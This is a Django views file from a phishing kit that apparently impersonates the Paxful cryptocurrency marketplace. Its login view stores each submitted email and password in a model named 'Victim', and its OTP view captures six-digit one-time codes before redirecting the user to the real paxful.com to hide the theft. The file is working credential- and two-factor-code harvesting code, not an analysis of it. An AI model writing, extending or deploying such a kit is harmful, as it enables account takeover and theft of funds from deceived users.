from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import Victim, OTP

# Create your views here.
def login(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        
        credentials =  Victim(email= email, password= password)
        credentials.save()
        
        return redirect('redirectuser')
    
    return render(request, 'login.html')
        

def otphandler(request):
    if request.method == 'POST':
        otp_code= ''.join(request.POST.get(f'otp_digit_{i}','') for i in range(1, 7))
        OTP.objects.create(otp_code= otp_code)
        
        return redirect('https://paxful.com')
      
    return render(request, 'otp-interface.html')

def redirectuser(request):
    return render(request, 'redirectuser.html')